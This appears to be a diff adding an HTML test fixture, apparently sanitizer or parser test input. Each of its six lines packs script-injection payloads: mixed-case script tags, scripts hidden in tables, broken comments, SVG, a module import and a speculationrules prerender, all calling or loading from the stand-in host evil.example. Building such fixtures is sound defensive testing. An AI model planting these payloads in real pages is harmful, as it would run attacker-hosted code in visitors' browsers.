@@ -1,0 +1,6 @@
+<p>before</p><SCRIPT>fetch('https://evil.example/ran');alert(1)</SCRIPT><ScRiPt src="https://evil.example/s.js"></ScRiPt>
+<table><tr><td>cell<script>fetch('https://evil.example/ran');alert(1)</script></td></tr><script>fetch('https://evil.example/ran');alert(1)</script></table>
+<!-- broken comment --!><script>fetch('https://evil.example/ran');alert(1)</script><!--><script>fetch('https://evil.example/ran');alert(1)</script>-->
+<script type="module">import 'https://evil.example/m.js';fetch('https://evil.example/ran');alert(1)</script>
+<script type="speculationrules">{"prerender":[{"source":"list","urls":["https://evil.example/pre"]}]}</script>
+<svg><script>fetch('https://evil.example/ran');alert(1)</script><script href="https://evil.example/x.js"></script></svg><p>after</p>
